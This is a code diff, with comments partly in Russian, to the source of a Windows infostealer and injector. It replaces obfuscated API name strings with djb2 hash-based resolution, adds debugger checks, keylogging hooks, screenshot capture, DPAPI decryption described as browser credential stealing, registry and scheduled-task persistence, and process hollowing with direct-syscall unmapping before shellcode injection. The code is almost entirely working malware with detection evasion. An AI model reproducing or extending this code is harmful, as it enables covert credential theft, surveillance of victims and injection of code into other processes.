+     if (!hUser32) printf("[InitApi] Warning: User32 handle not found.\n");
+     if (!hGdi32) printf("[InitApi] Warning: Gdi32 handle not found.\n");
+     if (!hCrypt32) printf("[InitApi] Warning: Crypt32 handle not found.\n");
+     if (!hShell32) printf("[InitApi] Warning: Shell32 handle not found.\n");
+     if (!hOle32) printf("[InitApi] Warning: Ole32 handle not found.\n");
+     if (!hGdiplus) printf("[InitApi] Warning: Gdiplus handle not found.\n");
+     if (!hIphlpapi) printf("[InitApi] Warning: Iphlpapi handle not found.\n");
 
-    // --- GDI+ and OLE pointers ---
-    HMODULE hGdiplus = LoadLibraryA("gdiplus.dll");
-    HMODULE hOle32 = LoadLibraryA("ole32.dll");
+    // --- Получаем остальные указатели через GetProcAddressByHash ---
+    printf("[InitApi] Resolving remaining API pointers by hash...\n");
 
-    if (!hGdiplus || !hOle32) {
-        printf("[InitApi] Failed to load gdiplus.dll (%p) or ole32.dll (%p).\n", hGdiplus, hOle32);
-        if (hGdiplus) FreeLibrary(hGdiplus);
-        if (hOle32) FreeLibrary(hOle32);
-        // Не считаем это фатальной ошибкой, скриншоты BMP все еще могут работать
-        printf("[InitApi] Warning: GDI+ features (JPEG screenshots) will be unavailable.\n");
+    // Kernel32 functions
+    g_api.ptrVirtualAllocEx = (VirtualAllocEx_t)GetProcAddressByHash(hKernel32, 0xE92E1A07); // djb2("VirtualAllocEx")
+    g_api.ptrWriteProcessMemory = (WriteProcessMemory_t)GetProcAddressByHash(hKernel32, 0xC614D7C5); // djb2("WriteProcessMemory")
+    g_api.ptrGetThreadContext = (GetThreadContext_t)GetProcAddressByHash(hKernel32, 0xC5C84903); // djb2("GetThreadContext")
+    g_api.ptrSetThreadContext = (SetThreadContext_t)GetProcAddressByHash(hKernel32, 0x61A8007A); // djb2("SetThreadContext")
+    g_api.ptrResumeThread = (ResumeThread_t)GetProcAddressByHash(hKernel32, 0x583C6A); // djb2("ResumeThread")
+    g_api.ptrTerminateProcess = (TerminateProcess_t)GetProcAddressByHash(hKernel32, 0x1D87A386); // djb2("TerminateProcess")
+    g_api.ptrCloseHandle = (CloseHandle_t)GetProcAddressByHash(hKernel32, 0x53020668); // djb2("CloseHandle")
+    g_api.ptrVirtualFreeEx = (VirtualFreeEx_t)GetProcAddressByHash(hKernel32, 0x70747228); // djb2("VirtualFreeEx")
+    g_api.ptrGetLastError = (GetLastError_t)GetProcAddressByHash(hKernel32, 0x6744577E); // djb2("GetLastError")
+    g_api.ptrFormatMessageA = (FormatMessageA_t)GetProcAddressByHash(hKernel32, 0xB7A8F44C); // djb2("FormatMessageA")
+    g_api.ptrLocalFree = (LocalFree_t)GetProcAddressByHash(hKernel32, 0xE1AF653); // djb2("LocalFree")
+    g_api.ptrGetProcessHeap = (GetProcessHeap_t)GetProcAddressByHash(hKernel32, 0x6483B61F); // djb2("GetProcessHeap")
+    g_api.ptrHeapAlloc = (HeapAlloc_t)GetProcAddressByHash(hKernel32, 0x69DA1CA); // djb2("HeapAlloc")
+    g_api.ptrHeapFree = (HeapFree_t)GetProcAddressByHash(hKernel32, 0x4E1EB492); // djb2("HeapFree")
+    g_api.ptrGetFileAttributesA = (GetFileAttributesA_t)GetProcAddressByHash(hKernel32, 0x4A46004F); // djb2("GetFileAttributesA")
+    g_api.ptrIsDebuggerPresent = (IsDebuggerPresent_t)GetProcAddressByHash(hKernel32, 0x316B65CB); // djb2("IsDebuggerPresent")
+    g_api.ptrCheckRemoteDebuggerPresent = (CheckRemoteDebuggerPresent_t)GetProcAddressByHash(hKernel32, 0x31ED8748); // djb2("CheckRemoteDebuggerPresent")
+    g_api.ptrGetCurrentProcess = (GetCurrentProcess_t)GetProcAddressByHash(hKernel32, 0x5B4BCF0F); // djb2("GetCurrentProcess")
+    g_api.ptrWideCharToMultiByte = (WideCharToMultiByte_t)GetProcAddressByHash(hKernel32, 0xBF97A7E2); // djb2("WideCharToMultiByte")
+    g_api.ptrMultiByteToWideChar = (MultiByteToWideChar_t)GetProcAddressByHash(hKernel32, 0x386A6085); // djb2("MultiByteToWideChar")
+    g_api.ptrSleep = (Sleep_t)GetProcAddressByHash(hKernel32, 0x7F8AF90E); // djb2("Sleep")
+    g_api.ptrCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)GetProcAddressByHash(hKernel32, 0x8B13218A); // djb2("CreateToolhelp32Snapshot")
+    g_api.ptrProcess32First = (Process32First_t)GetProcAddressByHash(hKernel32, 0x9E5C1F8F); // djb2("Process32First")
+    g_api.ptrProcess32Next = (Process32Next_t)GetProcAddressByHash(hKernel32, 0x8B45A773); // djb2("Process32Next")
+    g_api.ptrGetComputerNameA = (GetComputerNameA_t)GetProcAddressByHash(hKernel32, 0xB0D51A3E); // djb2("GetComputerNameA")
+    g_api.ptrRegOpenKeyExA = (RegOpenKeyExA_t)GetProcAddressByHash(hKernel32, 0xC36BE54); // djb2("RegOpenKeyExA") - Note: Advapi32.dll usually!
+    g_api.ptrRegEnumValueA = (RegEnumValueA_t)GetProcAddressByHash(hKernel32, 0xBA31C608); // djb2("RegEnumValueA") - Note: Advapi32.dll usually!
+    g_api.ptrRegCloseKey = (RegCloseKey_t)GetProcAddressByHash(hKernel32, 0x3B0B4F03); // djb2("RegCloseKey") - Note: Advapi32.dll usually!
+
+    // Advapi32 functions (Registry functions are typically here)
+    HMODULE hAdvapi32 = GetModuleBaseByHash(0x45F7CAB4); // djb2("advapi32.dll")
+    if(hAdvapi32){
+        g_api.ptrRegOpenKeyExA = (RegOpenKeyExA_t)GetProcAddressByHash(hAdvapi32, 0xC36BE54); // djb2("RegOpenKeyExA")
+        g_api.ptrRegEnumValueA = (RegEnumValueA_t)GetProcAddressByHash(hAdvapi32, 0xBA31C608); // djb2("RegEnumValueA")
+        g_api.ptrRegCloseKey = (RegCloseKey_t)GetProcAddressByHash(hAdvapi32, 0x3B0B4F03); // djb2("RegCloseKey")
+         g_api.ptrRegSetValueExW = (RegSetValueExW_t)GetProcAddressByHash(hAdvapi32, 0x65045A3); // djb2("RegSetValueExW")
+         g_api.ptrRegCreateKeyExW = (RegCreateKeyExW_t)GetProcAddressByHash(hAdvapi32, 0x43F95A26); // djb2("RegCreateKeyExW")
     } else {
-        ObfuscatedString startupName = OBFUSCATED("GdiplusStartup");
-        char* szStartupName = deobfuscate(startupName.data, startupName.length);
-        g_api.ptrGdiplusStartup = (GdiplusStartup_t)GetProcAddress(hGdiplus, szStartupName);
-        free(szStartupName);
-
-        ObfuscatedString shutdownName = OBFUSCATED("GdiplusShutdown");
-        char* szShutdownName = deobfuscate(shutdownName.data, shutdownName.length);
-        g_api.ptrGdiplusShutdown = (GdiplusShutdown_t)GetProcAddress(hGdiplus, szShutdownName);
-        free(szShutdownName);
-
-        ObfuscatedString createStreamName = OBFUSCATED("CreateStreamOnHGlobal");
-        char* szCreateStreamName = deobfuscate(createStreamName.data, createStreamName.length);
-        g_api.ptrCreateStreamOnHGlobal = (CreateStreamOnHGlobal_t)GetProcAddress(hOle32, szCreateStreamName);
-        free(szCreateStreamName);
-
-        ObfuscatedString getHGlobalName = OBFUSCATED("GetHGlobalFromStream");
-        char* szGetHGlobalName = deobfuscate(getHGlobalName.data, getHGlobalName.length);
-        g_api.ptrGetHGlobalFromStream = (GetHGlobalFromStream_t)GetProcAddress(hOle32, szGetHGlobalName);
-        free(szGetHGlobalName);
-
-        ObfuscatedString createBitmapName = OBFUSCATED("GdipCreateBitmapFromHBITMAP");
-        char* szCreateBitmapName = deobfuscate(createBitmapName.data, createBitmapName.length);
-        g_api.ptrGdipCreateBitmapFromHBITMAP = (GdipCreateBitmapFromHBITMAP_t)GetProcAddress(hGdiplus, szCreateBitmapName);
-        free(szCreateBitmapName);
-
-        ObfuscatedString saveImageName = OBFUSCATED("GdipSaveImageToStream");
-        char* szSaveImageName = deobfuscate(saveImageName.data, saveImageName.length);
-        g_api.ptrGdipSaveImageToStream = (GdipSaveImageToStream_t)GetProcAddress(hGdiplus, szSaveImageName);
-        free(szSaveImageName);
-
-        ObfuscatedString disposeImageName = OBFUSCATED("GdipDisposeImage");
-        char* szDisposeImageName = deobfuscate(disposeImageName.data, disposeImageName.length);
-        g_api.ptrGdipDisposeImage = (GdipDisposeImage_t)GetProcAddress(hGdiplus, szDisposeImageName);
-        free(szDisposeImageName);
-
-        ObfuscatedString getEncodersSizeName = OBFUSCATED("GdipGetImageEncodersSize");
-        char* szGetEncodersSizeName = deobfuscate(getEncodersSizeName.data, getEncodersSizeName.length);
-        g_api.ptrGdipGetImageEncodersSize = (GdipGetImageEncodersSize_t)GetProcAddress(hGdiplus, szGetEncodersSizeName);
-        free(szGetEncodersSizeName);
-
-        ObfuscatedString getEncodersName = OBFUSCATED("GdipGetImageEncoders");
-        char* szGetEncodersName = deobfuscate(getEncodersName.data, getEncodersName.length);
-        g_api.ptrGdipGetImageEncoders = (GdipGetImageEncoders_t)GetProcAddress(hGdiplus, szGetEncodersName);
-        free(szGetEncodersName);
-
-        // Проверяем критически важные указатели GDI+
-        if (!g_api.ptrGdiplusStartup || !g_api.ptrGdiplusShutdown || !g_api.ptrCreateStreamOnHGlobal || 
-            !g_api.ptrGetHGlobalFromStream || !g_api.ptrGdipCreateBitmapFromHBITMAP || 
-            !g_api.ptrGdipSaveImageToStream || !g_api.ptrGdipDisposeImage || 
-            !g_api.ptrGdipGetImageEncodersSize || !g_api.ptrGdipGetImageEncoders) {
-            printf("[InitApi] Failed to get one or more API function addresses for GDI+.\n");
-            printf("[InitApi] Warning: GDI+ features (JPEG screenshots) will be unavailable.\n");
-            // Не возвращаем FALSE, так как базовый функционал может еще работать
-            g_api.ptrGdiplusStartup = nullptr; // Сбрасываем указатели GDI+ чтобы потом их не использовать
-        } else {
-             printf("[InitApi] GDI+ API pointers initialized successfully.\n");
-        }
-        // Не выгружаем библиотеки gdiplus.dll и ole32.dll, они понадобятся
+        printf("[InitApi] Warning: Advapi32 handle not found. Registry functions might fail.\n");
+        // Fallback to kernel32 attempt already done, pointers might be null.
     }
 
-    // --- DPAPI and Shell32 pointers ---
-    HMODULE hCrypt32 = GetModuleHandleA("crypt32.dll"); // Уже должен быть загружен для Screenshot
-    HMODULE hShell32 = LoadLibraryA("shell32.dll");
+    // Iphlpapi function
+    if (hIphlpapi) {
+        g_api.ptrGetAdaptersInfo = (GetAdaptersInfo_t)GetProcAddressByHash(hIphlpapi, 0x738AF865); // djb2("GetAdaptersInfo")
+    } // else: warning already printed
 
-    if (!hCrypt32 || !hShell32) {
-        printf("[InitApi] Failed to get module handle for crypt32.dll (%p) or load shell32.dll (%p).\n", hCrypt32, hShell32);
-        if (hShell32) FreeLibrary(hShell32);
-        printf("[InitApi] Warning: DPAPI/Shell functions will be unavailable (browser credential stealing limited).\n");
-        // Не фатально, продолжаем
-    } else {
-        ObfuscatedString unprotectName = OBFUSCATED("CryptUnprotectData");
-        char* szUnprotectName = deobfuscate(unprotectName.data, unprotectName.length);
-        g_api.ptrCryptUnprotectData = (CryptUnprotectData_t)GetProcAddress(hCrypt32, szUnprotectName);
-        free(szUnprotectName);
+    // User32 functions (Keylogger, Screenshot)
+    if (hUser32) {
+        g_api.ptrSetWindowsHookExW = (SetWindowsHookExW_t)GetProcAddressByHash(hUser32, 0xBC12F40); // djb2("SetWindowsHookExW")
+        g_api.ptrUnhookWindowsHookEx = (UnhookWindowsHookEx_t)GetProcAddressByHash(hUser32, 0xB78C766F); // djb2("UnhookWindowsHookEx")
+        g_api.ptrCallNextHookEx = (CallNextHookEx_t)GetProcAddressByHash(hUser32, 0x23289BFE); // djb2("CallNextHookEx")
+        g_api.ptrGetAsyncKeyState = (GetAsyncKeyState_t)GetProcAddressByHash(hUser32, 0x677907C); // djb2("GetAsyncKeyState")
+        g_api.ptrGetMessageW = (GetMessageW_t)GetProcAddressByHash(hUser32, 0xE3059C64); // djb2("GetMessageW")
+        g_api.ptrTranslateMessage = (TranslateMessage_t)GetProcAddressByHash(hUser32, 0x48F390C1); // djb2("TranslateMessage")
+        g_api.ptrDispatchMessageW = (DispatchMessageW_t)GetProcAddressByHash(hUser32, 0x3EE64C45); // djb2("DispatchMessageW")
+        g_api.ptrToUnicode = (ToUnicode_t)GetProcAddressByHash(hUser32, 0x3B47084); // djb2("ToUnicode")
+        g_api.ptrGetKeyboardState = (GetKeyboardState_t)GetProcAddressByHash(hUser32, 0xE39B08E4); // djb2("GetKeyboardState")
+        g_api.ptrGetDC = (GetDC_t)GetProcAddressByHash(hUser32, 0x5BD7B858); // djb2("GetDC")
+        g_api.ptrReleaseDC = (ReleaseDC_t)GetProcAddressByHash(hUser32, 0x19B4DDC); // djb2("ReleaseDC")
+    } // else: warning already printed
 
-        ObfuscatedString getFolderPathName = OBFUSCATED("SHGetFolderPathW");
-        char* szGetFolderPathName = deobfuscate(getFolderPathName.data, getFolderPathName.length);
-        g_api.ptrSHGetFolderPathW = (SHGetFolderPathW_t)GetProcAddress(hShell32, szGetFolderPathName);
-        free(szGetFolderPathName);
+    // Gdi32 functions (Screenshot)
+    if (hGdi32) {
+        g_api.ptrCreateCompatibleDC = (CreateCompatibleDC_t)GetProcAddressByHash(hGdi32, 0xA7B85D10); // djb2("CreateCompatibleDC")
+        g_api.ptrGetDeviceCaps = (GetDeviceCaps_t)GetProcAddressByHash(hGdi32, 0xF880A40); // djb2("GetDeviceCaps")
+        g_api.ptrCreateCompatibleBitmap = (CreateCompatibleBitmap_t)GetProcAddressByHash(hGdi32, 0x618F1F5B); // djb2("CreateCompatibleBitmap")
+        g_api.ptrSelectObject = (SelectObject_t)GetProcAddressByHash(hGdi32, 0x486E3C6); // djb2("SelectObject")
+        g_api.ptrBitBlt = (BitBlt_t)GetProcAddressByHash(hGdi32, 0x21E2A70); // djb2("BitBlt")
+        g_api.ptrDeleteDC = (DeleteDC_t)GetProcAddressByHash(hGdi32, 0x397E1A66); // djb2("DeleteDC")
+        g_api.ptrDeleteObject = (DeleteObject_t)GetProcAddressByHash(hGdi32, 0x1E028BD); // djb2("DeleteObject")
+        g_api.ptrGetDIBits = (GetDIBits_t)GetProcAddressByHash(hGdi32, 0x81AF754B); // djb2("GetDIBits")
+    } // else: warning already printed
 
-        if (!g_api.ptrCryptUnprotectData || !g_api.ptrSHGetFolderPathW) {
-            printf("[InitApi] Failed to get one or more API function addresses for DPAPI/Shell.\n");
-            printf("[InitApi] Warning: DPAPI/Shell functions will be unavailable (browser credential stealing limited).\n");
-             g_api.ptrCryptUnprotectData = nullptr; // Сбрасываем, чтобы не использовать
-             g_api.ptrSHGetFolderPathW = nullptr;
-        } else {
-            printf("[InitApi] DPAPI and Shell API pointers initialized successfully.\n");
-        }
-        // Не выгружаем Shell32
+    // Crypt32 functions (Screenshot, DPAPI)
+    if (hCrypt32) {
+        g_api.ptrCryptBinaryToStringA = (CryptBinaryToStringA_t)GetProcAddressByHash(hCrypt32, 0x29438F5F); // djb2("CryptBinaryToStringA")
+        g_api.ptrCryptUnprotectData = (CryptUnprotectData_t)GetProcAddressByHash(hCrypt32, 0x8093815B); // djb2("CryptUnprotectData")
+    } // else: warning already printed
+
+    // Shell32 functions (DPAPI)
+    if (hShell32) {
+        g_api.ptrSHGetFolderPathW = (SHGetFolderPathW_t)GetProcAddressByHash(hShell32, 0xE6C4464F); // djb2("SHGetFolderPathW")
+    } // else: warning already printed
+
+    // GDI+ and OLE pointers (JPEG Screenshot, COM)
+    if (hGdiplus) {
+        g_api.ptrGdiplusStartup = (GdiplusStartup_t)GetProcAddressByHash(hGdiplus, 0x8708C3C0); // djb2("GdiplusStartup")
+        g_api.ptrGdiplusShutdown = (GdiplusShutdown_t)GetProcAddressByHash(hGdiplus, 0x438FD70); // djb2("GdiplusShutdown")
+        g_api.ptrGdipCreateBitmapFromHBITMAP = (GdipCreateBitmapFromHBITMAP_t)GetProcAddressByHash(hGdiplus, 0xD7004B73); // djb2("GdipCreateBitmapFromHBITMAP")
+        g_api.ptrGdipSaveImageToStream = (GdipSaveImageToStream_t)GetProcAddressByHash(hGdiplus, 0x97B72314); // djb2("GdipSaveImageToStream")
+        g_api.ptrGdipDisposeImage = (GdipDisposeImage_t)GetProcAddressByHash(hGdiplus, 0xE4AE1684); // djb2("GdipDisposeImage")
+        g_api.ptrGdipGetImageEncodersSize = (GdipGetImageEncodersSize_t)GetProcAddressByHash(hGdiplus, 0x1075A0A8); // djb2("GdipGetImageEncodersSize")
+        g_api.ptrGdipGetImageEncoders = (GdipGetImageEncoders_t)GetProcAddressByHash(hGdiplus, 0xCD9346); // djb2("GdipGetImageEncoders")
+    } // else: warning already printed
+    if (hOle32) {
+        g_api.ptrCreateStreamOnHGlobal = (CreateStreamOnHGlobal_t)GetProcAddressByHash(hOle32, 0xEA1796B6); // djb2("CreateStreamOnHGlobal")
+        g_api.ptrGetHGlobalFromStream = (GetHGlobalFromStream_t)GetProcAddressByHash(hOle32, 0xCA08568); // djb2("GetHGlobalFromStream")
+        g_api.ptrCoInitializeEx = (CoInitializeEx_t)GetProcAddressByHash(hOle32, 0x1C2DA595); // djb2("CoInitializeEx")
+        g_api.ptrCoCreateInstance = (CoCreateInstance_t)GetProcAddressByHash(hOle32, 0x1F85965A); // djb2("CoCreateInstance")
+        g_api.ptrCoUninitialize = (CoUninitialize_t)GetProcAddressByHash(hOle32, 0x97A36AD2); // djb2("CoUninitialize")
+    } // else: warning already printed
+
+    // Проверка критически важных указателей (пример)
+    if (!g_api.ptrVirtualAllocEx || !g_api.ptrWriteProcessMemory || !g_api.ptrCloseHandle || !g_api.ptrGetLastError) {
+        printf("[InitApi] Failed to resolve one or more essential Kernel32 functions by hash!\n");
+        return FALSE; // Считаем это фатальной ошибкой
     }
 
-    // --- COM pointers ---
-    HMODULE hOle32 = GetModuleHandleA("ole32.dll"); // Уже должен быть загружен для GDI+
-    if (!hOle32) {
-        hOle32 = LoadLibraryA("ole32.dll"); // Попытка загрузить, если не был
-    }
-
-    if (!hOle32) {
-        printf("[InitApi] Failed to load ole32.dll.\n");
-        printf("[InitApi] Warning: COM features (Task Scheduler persistence) will be unavailable.\n");
-        // Не фатально
-    } else {
-        ObfuscatedString initName = OBFUSCATED("CoInitializeEx");
-        char* szInitName = deobfuscate(initName.data, initName.length);
-        g_api.ptrCoInitializeEx = (CoInitializeEx_t)GetProcAddress(hOle32, szInitName);
-        free(szInitName);
-
-        ObfuscatedString createName = OBFUSCATED("CoCreateInstance");
-        char* szCreateName = deobfuscate(createName.data, createName.length);
-        g_api.ptrCoCreateInstance = (CoCreateInstance_t)GetProcAddress(hOle32, szCreateName);
-        free(szCreateName);
-
-        ObfuscatedString uninitName = OBFUSCATED("CoUninitialize");
-        char* szUninitName = deobfuscate(uninitName.data, uninitName.length);
-        g_api.ptrCoUninitialize = (CoUninitialize_t)GetProcAddress(hOle32, szUninitName);
-        free(szUninitName);
-
-        if (!g_api.ptrCoInitializeEx || !g_api.ptrCoCreateInstance || !g_api.ptrCoUninitialize) {
-             printf("[InitApi] Failed to get one or more API function addresses for COM.\n");
-             printf("[InitApi] Warning: COM features (Task Scheduler persistence) will be unavailable.\n");
-             g_api.ptrCoInitializeEx = nullptr; // Сбрасываем
-        } else {
-            printf("[InitApi] COM API pointers initialized successfully.\n");
-        }
-        // Не выгружаем ole32.dll
-    }
-     g_apiPointersInitialized = TRUE;
-    printf("[InitApi] All API pointers initialized successfully.\n");
+    g_apiPointersInitialized = TRUE;
+    printf("[InitApi] API pointer resolution attempt finished.\n");
     return TRUE;
 }
 
@@ -799,11 +1116,50 @@ EXPORT_FUNC int inject_process_hollowing(
     }
     printf("[Injector] Process created successfully (PID: %lu, TID: %lu)\n", pi.dwProcessId, pi.dwThreadId);
 
-    // --- Этап с NtUnmapViewOfSection пока пропускаем для упрощения ---
-    // TODO: Динамически получить адрес NtUnmapViewOfSection из ntdll.dll
-    // TODO: Получить ImageBaseAddress из PEB (через GetThreadContext и ReadProcessMemory)
-    // TODO: Вызвать NtUnmapViewOfSection(pi.hProcess, imageBaseAddress);
-    printf("[Injector] Skipping NtUnmapViewOfSection for now.\n");
+    // --- Получаем ImageBaseAddress и вызываем NtUnmapViewOfSection через Direct Syscall ---
+    printf("[Injector] Attempting to unmap original image using Direct Syscall...\n");
+    PROCESS_BASIC_INFORMATION pbi = {0};
+    ULONG returnLength = 0;
+    NTSTATUS status = DirectSyscall_NtQueryInformationProcess(
+        pi.hProcess,
+        0, // ProcessBasicInformation class
+        &pbi,
+        sizeof(pbi),
+        &returnLength
+    );
+
+    if (status >= 0 && returnLength == sizeof(pbi) && pbi.PebBaseAddress) {
+        printf("[Injector] Got PEB address: %p\n", pbi.PebBaseAddress);
+        // Читаем ImageBaseAddress из PEB удаленного процесса
+        // Оффсет ImageBaseAddress в PEB: 0x10 для x64, 0x08 для x86
+#ifdef _WIN64
+        PVOID imageBaseOffset = (PVOID)((BYTE*)pbi.PebBaseAddress + 0x10);
+#else
+        PVOID imageBaseOffset = (PVOID)((BYTE*)pbi.PebBaseAddress + 0x08);
+#endif
+        PVOID remoteImageBase = NULL;
+        SIZE_T bytesRead = 0;
+        if (ReadProcessMemory(pi.hProcess, imageBaseOffset, &remoteImageBase, sizeof(PVOID), &bytesRead) && bytesRead == sizeof(PVOID)) {
+             printf("[Injector] Read ImageBaseAddress from PEB: %p\n", remoteImageBase);
+             // Вызываем NtUnmapViewOfSection через Direct Syscall
+            status = DirectSyscall_NtUnmapViewOfSection(pi.hProcess, remoteImageBase);
+            if (status >= 0) {
+                 printf("[Injector] NtUnmapViewOfSection (Direct Syscall) successful.\n");
+            } else {
+                printf("[Injector] NtUnmapViewOfSection (Direct Syscall) failed. Status: 0x%X\n", status);
+                 // Не фатальная ошибка, можем продолжить инъекцию шеллкода
+                 // Но оригинальный образ не будет выгружен
+            }
+        } else {
+             lastError = GetLastError();
+             printf("[Injector] Failed to read ImageBaseAddress from remote PEB. Error: %lu\n", lastError);
+             // Не фатальная ошибка
+        }
+    } else {
+         printf("[Injector] Failed to get ProcessBasicInformation or PEB address. Status: 0x%X\n", status);
+         // Не фатальная ошибка
+    }
+    // --- Конец блока NtUnmapViewOfSection ---
 
     // 2. Выделяем память в удаленном процессе для шеллкода
     printf("[Injector] Allocating memory in remote process (size: %lu bytes)\n", shellcodeSize);
@@ -1562,6 +1918,26 @@ std::string WideToUtf8(const std::wstring& wideStr) {
     return utf8Str;
 }
 
+// --- Реализация wildcard match (замена PathMatchSpecW) ---
+bool wildcard_match(const std::wstring& str, const std::wstring& pattern) {
+    size_t s = 0, p = 0, star = std::wstring::npos, ss = 0;
+    while (s < str.size()) {
+        if (p < pattern.size() && (pattern[p] == L'?' || towlower(pattern[p]) == towlower(str[s]))) {
+            ++s; ++p;
+        } else if (p < pattern.size() && pattern[p] == L'*') {
+            star = p++;
+            ss = s;
+        } else if (star != std::wstring::npos) {
+            p = star + 1;
+            s = ++ss;
+        } else {
+            return false;
+        }
+    }
+    while (p < pattern.size() && pattern[p] == L'*') ++p;
+    return p == pattern.size();
+}
+
 // Основная рекурсивная функция сканирования (внутренняя)
 void ScanDirectoryInternal(
     const std::wstring& currentPath,
@@ -1596,7 +1972,9 @@ void ScanDirectoryInternal(
 
         if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
             // Если это директория, рекурсивно сканируем её
-            ScanDirectoryInternal(fullPath, masks, currentDepth + 1, maxDepth, foundFiles, api);
+            if (currentDepth < maxDepth) {
+                ScanDirectoryInternal(fullPath, masks, currentDepth + 1, maxDepth, foundFiles, api);
+            }
         } else {
             // Если это файл, проверяем соответствие маскам
             bool match = false;
@@ -1604,7 +1982,7 @@ void ScanDirectoryInternal(
                 // Используем PathMatchSpecW из Shlwapi.dll
                  // Потребуется инициализировать указатель на нее
                  // Пока предполагаем, что Shlwapi загружена или доступна
-                if (PathMatchSpecW(findData.cFileName, mask.c_str())) {
+                if (wildcard_match(findData.cFileName, mask)) {
                     match = true;
                     break;
                 }
